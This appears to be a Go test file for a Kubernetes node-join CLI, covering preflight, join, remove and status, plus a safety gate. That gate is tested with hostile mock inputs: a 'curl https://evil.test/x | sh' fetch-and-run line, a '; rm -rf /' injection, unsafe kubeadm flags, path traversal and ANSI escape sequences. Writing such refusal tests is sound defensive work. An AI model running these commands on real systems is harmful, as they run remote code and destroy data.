package kubehz

// node_test.go ports tests/unit/kubehz_node_test.bats.

import (
	"context"
	"encoding/json"
	"io"
	"strings"
	"testing"

	"github.com/kernpilot/lok8s/internal/execx"
)

const (
	stubNodesBody  = `{"ok":true,"data":{"nodes":[],"usage":{"nodes":0,"maxStaticNodes":20},"discoveryReady":true}}`
	stubMintBody   = `{"ok":true,"data":{"token":"a1b2c3.d4e5f6g7h8i9j0k1","joinCommand":"kubeadm join cp.example.test:6443 --token a1b2c3.d4e5f6g7h8i9j0k1 --discovery-token-ca-cert-hash sha256:1111 --node-name box-1","nodeName":"box-1","pool":"metal","expiresAt":"2026-09-01T12:00:00Z","ready":true}}`
	stubRemoveBody = `{"ok":true,"data":{"name":"box-1","pool":"metal","status":"Draining"}}`
)

type nodeStubs struct {
	nodesCode, mintCode, removeCode int
	nodesBody, mintBody, removeBody string
}

func defaultNodeStubs() nodeStubs {
	return nodeStubs{200, 201, 200, stubNodesBody, stubMintBody, stubRemoveBody}
}

// nodeHarness is _stub_all: hosted spec, mocked api, kubeadm present, root,
// and a hostname to default from.
func nodeHarness(t *testing.T, s nodeStubs, hosting, apiURL string) *harness {
	h := newHarness(t)
	if apiURL == "" {
		apiURL = h.apiURL()
	}
	h.writeSpec("acme.example.org", specYAML("KubeOne", "    hosting: "+hosting+"\n    access: managed\n    apiUrl: "+apiURL+"\n"))
	h.handle("GET /api/clusters/cl-1234abcd/nodes", s.nodesCode, s.nodesBody)
	h.handle("GET /api/clusters", 200, `{"ok":true,"data":[{"id":"cl-1234abcd","domain":"acme.example.org","createdAt":"2026-01-01T00:00:00Z"}]}`)
	h.handle("POST /api/clusters/cl-1234abcd/nodes/join-token", s.mintCode, s.mintBody)
	h.handle("DELETE /api/clusters/cl-1234abcd/nodes/box-1", s.removeCode, s.removeBody)
	h.ctx.IsRoot = func() bool { return true }
	h.ctx.LookPath = func(tool string) bool { return tool == "kubeadm" }
	return h
}

func kubeadmArgv(h *harness) []string {
	for _, c := range h.runner.calls {
		if c.Name == "kubeadm" {
			return c.Args
		}
	}
	return nil
}

func mintBody(t *testing.T, h *harness) map[string]any {
	t.Helper()
	r := h.lastReq("POST", "/nodes/join-token")
	if r == nil {
		t.Fatal("no mint request")
	}
	var m map[string]any
	_ = json.Unmarshal([]byte(r.Body), &m)
	return m
}

// ── preflight ────────────────────────────────────────────

func TestNodePreflightHostingGate(t *testing.T) {
	h := nodeHarness(t, defaultNodeStubs(), "self", "")
	_, _, err := h.ctx.nodePreflight(context.Background(), "acme.example.org", "join a node", "")
	mustErr(t, err)
	mustContain(t, h.output(), "runs its own control plane")
	mustContain(t, h.output(), "your own API server")

	h = nodeHarness(t, defaultNodeStubs(), "shared", "")
	_, _, err = h.ctx.nodePreflight(context.Background(), "acme.example.org", "join a node", "")
	mustErr(t, err)
	mustContain(t, h.output(), "hosting: shared")
	mustContain(t, h.output(), "lo kubehz join <node-name>")
}

func TestNodePreflightHTTPSAndToken(t *testing.T) {
	h := nodeHarness(t, defaultNodeStubs(), "hosted", "http://api.example.test")
	_, _, err := h.ctx.nodePreflight(context.Background(), "acme.example.org", "join a node", "")
	mustErr(t, err)
	mustContain(t, h.output(), "must use HTTPS")
	if len(h.reqs()) != 0 {
		t.Fatal("no request before the https gate")
	}

	h = nodeHarness(t, defaultNodeStubs(), "hosted", "")
	delete(h.env, "KUBEHZ_TOKEN")
	_, _, err = h.ctx.nodePreflight(context.Background(), "acme.example.org", "join a node", "")
	mustErr(t, err)
	mustContain(t, h.output(), "KUBEHZ_TOKEN is required to join a node")
	mustContain(t, h.output(), "clusters:write")

	h = nodeHarness(t, defaultNodeStubs(), "hosted", "")
	_, _, err = h.ctx.nodePreflight(context.Background(), "", "join a node", "")
	mustErr(t, err)
	mustContain(t, h.output(), "No active domain")
}

func TestNodePreflightClusterID(t *testing.T) {
	h := nodeHarness(t, defaultNodeStubs(), "hosted", "")
	_, _, err := h.ctx.nodePreflight(context.Background(), "acme.example.org", "join a node", "../../admin/tenants")
	mustErr(t, err)
	mustContain(t, h.output(), "is not a cluster id")
	if len(h.reqs()) != 0 {
		t.Fatal("a traversal must not travel")
	}

	_, id, err := h.ctx.nodePreflight(context.Background(), "acme.example.org", "join a node", "cl-explicit")
	mustOK(t, err, h.output())
	if id != "cl-explicit" || len(h.reqs()) != 0 {
		t.Fatalf("--cluster-id must win without asking the registry: %s %v", id, h.reqs())
	}

	_, id, err = h.ctx.nodePreflight(context.Background(), "acme.example.org", "join a node", "")
	mustOK(t, err, h.output())
	if id != "cl-1234abcd" {
		t.Fatalf("id = %s", id)
	}

	h.writeSpec("other.example.org", specYAML("KubeOne", "    hosting: hosted\n    apiUrl: "+h.apiURL()+"\n"))
	h.reset()
	_, _, err = h.ctx.nodePreflight(context.Background(), "other.example.org", "join a node", "")
	mustErr(t, err)
	mustContain(t, h.output(), "holds no cluster for other.example.org")
	mustContain(t, h.output(), "--cluster-id cl-xxxxxxxx")

	h.reset()
	_, _, err = h.ctx.nodePreflight(context.Background(), "nowhere.example.org", "join a node", "")
	mustErr(t, err)
	mustContain(t, h.output(), "No cluster.lok8s.yaml for domain: nowhere.example.org")
}

// ── join ─────────────────────────────────────────────────

func TestNodeJoinDefaultsNameToShortHostname(t *testing.T) {
	h := nodeHarness(t, defaultNodeStubs(), "hosted", "")
	mustOK(t, h.ctx.NodeJoin(context.Background(), "acme.example.org", NodeOpts{Pool: "metal", PrintOnly: true}), h.output())
	mustContain(t, h.output(), "Node 'box-1' joins pool 'metal'")
	if mintBody(t, h)["nodeName"] != "box-1" {
		t.Fatal("nodeName")
	}
}

func TestNodeJoinRefusesBadName(t *testing.T) {
	h := nodeHarness(t, defaultNodeStubs(), "hosted", "")
	mustErr(t, h.ctx.NodeJoin(context.Background(), "acme.example.org", NodeOpts{Name: "Box_1", Pool: "metal", PrintOnly: true}))
	mustContain(t, h.output(), "is not a node name the platform accepts")
	mustContain(t, h.output(), "DNS label")
	if h.anyReq("POST", "/join-token") {
		t.Fatal("nothing may be minted")
	}
}

func TestNodeJoinPoolInference(t *testing.T) {
	s := defaultNodeStubs()
	s.nodesBody = `{"ok":true,"data":{"nodes":[{"name":"box-0","pool":"metal","status":"Ready"}],"usage":{"nodes":1,"maxStaticNodes":20},"discoveryReady":true}}`
	h := nodeHarness(t, s, "hosted", "")
	mustOK(t, h.ctx.NodeJoin(context.Background(), "acme.example.org", NodeOpts{Name: "box-1", PrintOnly: true}), h.output())
	mustContain(t, h.output(), "joins pool 'metal'")
	if mintBody(t, h)["pool"] != "metal" {
		t.Fatal("pool")
	}

	s.nodesBody = `{"ok":true,"data":{"nodes":[{"name":"a","pool":"metal"},{"name":"b","pool":"edge"}],"usage":{"nodes":2,"maxStaticNodes":20},"discoveryReady":true}}`
	h = nodeHarness(t, s, "hosted", "")
	mustErr(t, h.ctx.NodeJoin(context.Background(), "acme.example.org", NodeOpts{Name: "box-1", PrintOnly: true}))
	mustContain(t, h.output(), "name the static pool")
	mustContain(t, h.output(), "--pool <pool-name>")

	h = nodeHarness(t, defaultNodeStubs(), "hosted", "")
	mustErr(t, h.ctx.NodeJoin(context.Background(), "acme.example.org", NodeOpts{Name: "box-1", PrintOnly: true}))
	mustContain(t, h.output(), "--pool <pool-name>")
}

func TestNodeJoinPreconditionsBeforeMint(t *testing.T) {
	h := nodeHarness(t, defaultNodeStubs(), "hosted", "")
	h.ctx.LookPath = func(string) bool { return false }
	mustErr(t, h.ctx.NodeJoin(context.Background(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal"}))
	mustContain(t, h.output(), "kubeadm is not on this machine")
	mustContain(t, h.output(), "--print-only")
	if h.anyReq("POST", "/join-token") {
		t.Fatal("minted without kubeadm")
	}

	h = nodeHarness(t, defaultNodeStubs(), "hosted", "")
	h.ctx.IsRoot = func() bool { return false }
	mustErr(t, h.ctx.NodeJoin(context.Background(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal"}))
	mustContain(t, h.output(), "must run as root")
	if h.anyReq("POST", "/join-token") {
		t.Fatal("minted as non-root")
	}

	h = nodeHarness(t, defaultNodeStubs(), "hosted", "")
	h.ctx.IsRoot = func() bool { return false }
	h.ctx.LookPath = func(string) bool { return false }
	mustOK(t, h.ctx.NodeJoin(context.Background(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal", PrintOnly: true}), h.output())
	mustContain(t, h.output(), "kubeadm join cp.example.test:6443")
}

func TestNodeJoinKubeletVersionRidesWithMint(t *testing.T) {
	h := nodeHarness(t, defaultNodeStubs(), "hosted", "")
	h.ctx.LookPath = func(tool string) bool { return true }
	h.runner.handler = func(c execx.Cmd, _ string) error {
		if c.Name == "kubelet" {
			io.WriteString(c.Stdout, "Kubernetes v1.33.4\n")
		}
		return nil
	}
	mustOK(t, h.ctx.NodeJoin(context.Background(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal", PrintOnly: true}), h.output())
	if mintBody(t, h)["kubeletVersion"] != "v1.33.4" {
		t.Fatalf("%v", mintBody(t, h))
	}

	h = nodeHarness(t, defaultNodeStubs(), "hosted", "")
	mustOK(t, h.ctx.NodeJoin(context.Background(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal", PrintOnly: true}), h.output())
	if _, has := mintBody(t, h)["kubeletVersion"]; has {
		t.Fatal("no kubelet → no version key")
	}

	h = nodeHarness(t, defaultNodeStubs(), "hosted", "")
	h.ctx.LookPath = func(tool string) bool { return true }
	mustOK(t, h.ctx.NodeJoin(context.Background(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal", KubeletVersion: "v1.31.0", PrintOnly: true}), h.output())
	if mintBody(t, h)["kubeletVersion"] != "v1.31.0" {
		t.Fatal("override")
	}
}

func TestNodeJoinPrintOnly(t *testing.T) {
	h := nodeHarness(t, defaultNodeStubs(), "hosted", "")
	mustOK(t, h.ctx.NodeJoin(context.Background(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal", NodeIP: "203.0.113.7", PrintOnly: true}), h.output())
	mustContain(t, h.output(), "kubeadm join cp.example.test:6443 --token a1b2c3.d4e5f6g7h8i9j0k1")
	mustContain(t, h.output(), "2026-09-01T12:00:00Z")
	mustContain(t, h.output(), "single use")
	mustContain(t, h.output(), "--node-ip 203.0.113.7")
	if kubeadmArgv(h) != nil {
		t.Fatal("kubeadm must not run")
	}
}

func TestNodeJoinRunsExactArgv(t *testing.T) {
	h := nodeHarness(t, defaultNodeStubs(), "hosted", "")
	mustOK(t, h.ctx.NodeJoin(context.Background(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal"}), h.output())
	mustContain(t, h.output(), "node 'box-1' joined cluster cl-1234abcd")
	want := []string{"join", "cp.example.test:6443", "--token", "a1b2c3.d4e5f6g7h8i9j0k1", "--discovery-token-ca-cert-hash", "sha256:1111", "--node-name", "box-1"}
	if got := kubeadmArgv(h); strings.Join(got, "\n") != strings.Join(want, "\n") {
		t.Fatalf("argv:\n%v\nwant\n%v", got, want)
	}

	h = nodeHarness(t, defaultNodeStubs(), "hosted", "")
	mustOK(t, h.ctx.NodeJoin(context.Background(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal", NodeIP: "203.0.113.7"}), h.output())
	got := kubeadmArgv(h)
	if strings.Join(got[len(got)-2:], "\n") != "--node-ip\n203.0.113.7" {
		t.Fatalf("node-ip tail: %v", got)
	}
}

func TestNodeJoinFailingKubeadm(t *testing.T) {
	h := nodeHarness(t, defaultNodeStubs(), "hosted", "")
	h.runner.handler = func(c execx.Cmd, _ string) error {
		if c.Name == "kubeadm" {
			io.WriteString(c.Stderr, "preflight failed\n")
			return exitErr(1)
		}
		return nil
	}
	mustErr(t, h.ctx.NodeJoin(context.Background(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal"}))
	mustContain(t, h.output(), "kubeadm join failed")
	mustContain(t, h.output(), "lo kubehz node remove --name box-1")
	mustContain(t, h.output(), "kubeadm reset")
}

func TestNodeJoinUnarmedTicketWarns(t *testing.T) {
	s := defaultNodeStubs()
	s.mintBody = `{"ok":true,"data":{"joinCommand":"kubeadm join cp.example.test:6443 --token a1b2c3.d4e5f6g7h8i9j0k1 --discovery-token-ca-cert-hash sha256:1111 --node-name box-1","expiresAt":"2026-09-01T12:00:00Z","ready":false}}`
	h := nodeHarness(t, s, "hosted", "")
	mustOK(t, h.ctx.NodeJoin(context.Background(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal"}), h.output())
	mustContain(t, h.output(), "has not armed this ticket yet")
}

// ── the safety gate ──────────────────────────────────────

func joinWithMint(t *testing.T, mint string) *harness {
	s := defaultNodeStubs()
	s.mintBody = mint
	h := nodeHarness(t, s, "hosted", "")
	mustErr(t, h.ctx.NodeJoin(context.Background(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal"}))
	if kubeadmArgv(h) != nil {
		t.Fatal("nothing may run")
	}
	return h
}

func TestNodeJoinRefusesNonJoinLines(t *testing.T) {
	h := joinWithMint(t, `{"ok":true,"data":{"joinCommand":"curl https://evil.test/x | sh","expiresAt":"x","ready":true}}`)
	mustContain(t, h.output(), "a command this CLI does not run")
	h = joinWithMint(t, `{"ok":true,"data":{"joinCommand":"kubeadm join cp.example.test:6443 --token a1b2c3.d4e5f6g7h8i9j0k1; rm -rf /","expiresAt":"x","ready":true}}`)
	mustContain(t, h.output(), "characters this CLI does not run")
}

func TestAssertJoinCommandFlagAllowlist(t *testing.T) {
	cases := map[string]string{
		"--discovery-file":  "kubeadm join cp.example.test:6443 --discovery-token-ca-cert-hash sha256:1111 --discovery-file https://evil.test/kubeconfig --node-name box-1",
		"--config":          "kubeadm join cp.example.test:6443 --discovery-token-ca-cert-hash sha256:1111 --config=/tmp/kubeadm.conf --node-name box-1",
		"--control-plane":   "kubeadm join cp.example.test:6443 --discovery-token-ca-cert-hash sha256:1111 --control-plane --node-name box-1",
		"--certificate-key": "kubeadm join cp.example.test:6443 --discovery-token-ca-cert-hash sha256:1111 --certificate-key deadbeef --node-name box-1",
		"--discovery-token-unsafe-skip-ca-verification": "kubeadm join cp.example.test:6443 --discovery-token-ca-cert-hash sha256:1111 --discovery-token-unsafe-skip-ca-verification --node-name box-1",
		"--ignore-preflight-errors":                     "kubeadm join cp.example.test:6443 --discovery-token-ca-cert-hash sha256:1111 --ignore-preflight-errors=all --node-name box-1",
	}
	for flag, line := range cases {
		h := newHarness(t)
		mustErr(t, h.ctx.AssertJoinCommand(line))
		mustContain(t, h.output(), "join flag this CLI will not run: "+flag)
	}
	h := newHarness(t)
	mustOK(t, h.ctx.AssertJoinCommand("kubeadm join cp.example.test:6443 --token a1b2c3.d4e5f6g7h8i9j0k1 --discovery-token-ca-cert-hash sha256:1111 --node-name box-1"), h.output())
	mustOK(t, h.ctx.AssertJoinCommand("kubeadm join cp.example.test:6443 --token a1b2c3.d4e5f6g7h8i9j0k1 --discovery-token-ca-cert-hash sha256:1111 --discovery-token-ca-cert-hash sha256:2222 --node-name box-1"), h.output())
	mustErr(t, h.ctx.AssertJoinCommand("kubeadm join cp.example.test:6443 --token a1b2c3.d4e5f6g7h8i9j0k1 --node-name box-1"))
	mustContain(t, h.output(), "pins no CA fingerprint")
	h.reset()
	mustErr(t, h.ctx.AssertJoinCommand("kubeadm join not-an-endpoint --token a1b2c3.d4e5f6g7h8i9j0k1 --discovery-token-ca-cert-hash sha256:1111 --node-name box-1"))
	mustContain(t, h.output(), "not a host:port")
}

func TestNodeJoinPostMintRefusalsNameTheSlot(t *testing.T) {
	h := joinWithMint(t, `{"ok":true,"data":{"joinCommand":"kubeadm join cp.example.test:6443 --discovery-token-ca-cert-hash sha256:1111 --discovery-token-unsafe-skip-ca-verification --node-name box-1","expiresAt":"x","ready":true}}`)
	mustContain(t, h.output(), "join flag this CLI will not run: --discovery-token-unsafe-skip-ca-verification")
	mustContain(t, h.output(), "holds a node slot")
	mustContain(t, h.output(), "lo kubehz node remove --name box-1")

	h = joinWithMint(t, `{"ok":true,"data":{"joinCommand":"kubeadm join cp.example.test:6443 --token a1b2c3.d4e5f6g7h8i9j0k1 --node-name box-1","expiresAt":"x","ready":true}}`)
	mustContain(t, h.output(), "pins no CA fingerprint")
	mustContain(t, h.output(), "holds a node slot")

	h = joinWithMint(t, `{"ok":true,"data":{"token":"a1b2c3.d4e5f6g7h8i9j0k1","expiresAt":"x"}}`)
	mustContain(t, h.output(), "returned no join command")
	mustContain(t, h.output(), "holds a node slot")

	h = joinWithMint(t, `<html><body>502 Bad Gateway</body></html>`)
	mustContain(t, h.output(), "returned no join command")
	mustContain(t, h.output(), "holds a node slot")
}

// ── the api's refusal vocabulary ─────────────────────────

func TestNodeErrorVocabulary(t *testing.T) {
	cases := []struct {
		code  int
		body  string
		wants []string
	}{
		{400, `{"ok":false,"data":{"code":"STATIC_POOLS_NOT_ENABLED","message":"static pools are not enabled"}}`, []string{"staticPoolsEnabled", "kubehz support"}},
		{400, `{"ok":false,"data":{"code":"KUBELET_BELOW_FLOOR","message":"v1.29.0 is below the floor v1.31"}}`, []string{"kubelet on this machine is too old", "v1.29.0 is below the floor v1.31", "two minor versions"}},
		{403, `{"ok":false,"data":{"code":"QUOTA_EXCEEDED","message":"20 of 20 nodes"}}`, []string{"no free slot", "lo kubehz node remove --name"}},
		{409, `{"ok":false,"data":{"code":"CONTROL_PLANE_NOT_READY","message":"no discovery"}}`, []string{"has not published its join address", "kind: static"}},
		{409, `{"ok":false,"data":{"code":"NODE_EXISTS","message":"box-1 exists"}}`, []string{"already holds a node with that name", "--name", "lo kubehz node remove"}},
		{409, `{"ok":false,"data":{"code":"POOL_NOT_STATIC","message":"metal is a machineDeployment pool"}}`, []string{"kind: static"}},
		{403, `{"ok":false,"data":{"code":"STEP_UP_REQUIRED","message":"fresh sign-in required"}}`, []string{"KUBEHZ_TOKEN"}},
		{418, `{"ok":false,"data":{"code":"SOMETHING_NEW","message":"the api knows best","help":"read the docs"}}`, []string{"the api knows best", "read the docs"}},
	}
	for _, tc := range cases {
		s := defaultNodeStubs()
		s.mintCode, s.mintBody = tc.code, tc.body
		h := nodeHarness(t, s, "hosted", "")
		mustErr(t, h.ctx.NodeJoin(context.Background(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal"}))
		for _, w := range tc.wants {
			mustContain(t, h.output(), w)
		}
	}
}

// ── remove ───────────────────────────────────────────────

func TestNodeRemove(t *testing.T) {
	h := nodeHarness(t, defaultNodeStubs(), "hosted", "")
	mustOK(t, h.ctx.NodeRemove(context.Background(), "acme.example.org", NodeOpts{Name: "box-1"}), h.output())
	for _, w := range []string{"node 'box-1' is draining (pool metal).", "slot is free", "never the hardware", "kubeadm reset"} {
		mustContain(t, h.output(), w)
	}
	if !h.anyReq("DELETE", "/api/clusters/cl-1234abcd/nodes/box-1") {
		t.Fatal("no DELETE")
	}

	h = nodeHarness(t, defaultNodeStubs(), "hosted", "")
	mustErr(t, h.ctx.NodeRemove(context.Background(), "acme.example.org", NodeOpts{Name: "../../clusters"}))
	mustContain(t, h.output(), "is not a node name the platform accepts")
	if len(h.reqs()) != 0 {
		t.Fatal("no request for a bad name")
	}

	s := defaultNodeStubs()
	s.removeCode, s.removeBody = 404, `{"ok":false,"data":{"code":"NOT_FOUND","message":"Node not found on this cluster"}}`
	h = nodeHarness(t, s, "hosted", "")
	mustErr(t, h.ctx.NodeRemove(context.Background(), "acme.example.org", NodeOpts{Name: "box-1"}))
	mustContain(t, h.output(), "holds no node named 'box-1'")
	mustContain(t, h.output(), "lo kubehz node status")
}

// ── status ───────────────────────────────────────────────

func TestNodeStatus(t *testing.T) {
	s := defaultNodeStubs()
	s.nodesBody = `{"ok":true,"data":{"nodes":[{"name":"box-1","pool":"metal","status":"Ready","joinedAt":"2026-08-30T10:00:00Z"},{"name":"box-2","pool":"metal","status":"Joining","joinedAt":null}],"usage":{"nodes":2,"maxStaticNodes":20},"discoveryReady":true}}`
	h := nodeHarness(t, s, "hosted", "")
	mustOK(t, h.ctx.NodeStatus(context.Background(), "acme.example.org", NodeOpts{}), h.output())
	for _, w := range []string{"Cluster: cl-1234abcd (acme.example.org)", "Nodes:   2/20", "NAME", "box-1", "Ready", "2026-08-30T10:00:00Z", "box-2", "Joining"} {
		mustContain(t, h.output(), w)
	}
	mustContain(t, h.output(), "  box-2                    metal            Joining    -")
	mustNotContain(t, h.output(), "has not published its join address")

	h = nodeHarness(t, defaultNodeStubs(), "hosted", "")
	mustOK(t, h.ctx.NodeStatus(context.Background(), "acme.example.org", NodeOpts{}), h.output())
	mustContain(t, h.output(), "No nodes yet")
	mustContain(t, h.output(), "lo kubehz node join --pool")

	s.nodesBody = `{"ok":true,"data":{"nodes":[],"usage":{"nodes":0,"maxStaticNodes":20},"discoveryReady":false}}`
	h = nodeHarness(t, s, "hosted", "")
	mustOK(t, h.ctx.NodeStatus(context.Background(), "acme.example.org", NodeOpts{}), h.output())
	mustContain(t, h.output(), "has not published its join address")
}

// ── server strings on the terminal ───────────────────────

func TestNodeScrubsANSI(t *testing.T) {
	s := defaultNodeStubs()
	s.mintBody = `{"ok":true,"data":{"joinCommand":"kubeadm join cp.example.test:6443 --token a1b2c3.d4e5f6g7h8i9j0k1 --discovery-token-ca-cert-hash sha256:1111 --node-name box-1","expiresAt":"2026-09-01T12:00:00Z\u001b[2J\u001b[Hpwned","ready":true}}`
	h := nodeHarness(t, s, "hosted", "")
	mustOK(t, h.ctx.NodeJoin(context.Background(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal", PrintOnly: true}), h.output())
	mustContain(t, h.output(), "2026-09-01T12:00:00Z")
	mustNotContain(t, h.output(), "\033")

	s = defaultNodeStubs()
	s.mintCode, s.mintBody = 400, `{"ok":false,"data":{"code":"KUBELET_BELOW_FLOOR","message":"v1.29.0 is below\u001b[31m the floor"}}`
	h = nodeHarness(t, s, "hosted", "")
	mustErr(t, h.ctx.NodeJoin(context.Background(), "acme.example.org", NodeOpts{Name: "box-1", Pool: "metal"}))
	mustContain(t, h.output(), "v1.29.0 is below")
	mustNotContain(t, h.output(), "\033[31m")

	s = defaultNodeStubs()
	s.removeBody = `{"ok":true,"data":{"name":"box-1","pool":"metal\u001b[2J","status":"Draining"}}`
	h = nodeHarness(t, s, "hosted", "")
	mustOK(t, h.ctx.NodeRemove(context.Background(), "acme.example.org", NodeOpts{Name: "box-1"}), h.output())
	mustContain(t, h.output(), "pool metal")
	mustNotContain(t, h.output(), "\033")

	s = defaultNodeStubs()
	s.nodesBody = `{"ok":true,"data":{"nodes":[{"name":"box-\u001b[31m1","pool":"metal","status":"Ready","joinedAt":"2026-08-30T10:00:00Z"}],"usage":{"nodes":1,"maxStaticNodes":20},"discoveryReady":true}}`
	h = nodeHarness(t, s, "hosted", "")
	mustOK(t, h.ctx.NodeStatus(context.Background(), "acme.example.org", NodeOpts{}), h.output())
	mustContain(t, h.output(), "box-")
	mustNotContain(t, h.output(), "\033")
}

func TestRejectGlobalClusterFlag(t *testing.T) {
	h := newHarness(t)
	mustErr(t, h.ctx.RejectGlobalClusterFlag())
	mustContain(t, h.output(), "--cluster/-s names the kind cluster")
	mustContain(t, h.output(), "--cluster-id cl-xxxxxxxx")
}
